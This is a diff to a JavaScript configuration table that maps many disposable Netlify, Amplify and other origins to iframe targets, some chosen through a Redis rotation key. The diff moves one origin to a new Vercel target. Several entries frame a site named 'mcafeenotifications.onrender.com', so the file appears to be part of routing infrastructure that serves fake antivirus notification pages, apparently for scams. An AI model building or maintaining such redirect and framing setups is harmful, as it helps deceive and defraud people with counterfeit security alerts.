@@ -85,6 +85,7 @@ async function getRotationTarget(key) {
 const ORIGIN_GROUPS = {
   rocky: {
     "https://cheery-douhua-d9bd03.netlify.app": { method: "iframe", target: "elegant-truffle-a0f9f7.netlify.app", redisKey: "rotation:target_url" },
+    "https://cozy-kheer-cea1f9.netlify.app": { method: "iframe", target: "https://web-os1.vercel.app" },
     "https://lambent-maamoul-1de7b2.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://nimble-bonbon-e8f851.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://spontaneous-salamander-ec6bf0.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
@@ -96,7 +97,6 @@ const ORIGIN_GROUPS = {
     // "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://n-rand.vercel.app", redisKey: "rotation:target_url" },
     "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://h-you.vercel.app" },
     "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://h-you.vercel.app" },
-    "https://cozy-kheer-cea1f9.netlify.app": { method: "iframe", target: "elegant-truffle-a0f9f7.netlify.app", redisKey: "rotation:target_url"  },
   },
   aomine: {
     "https://zen-hawellness.life": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
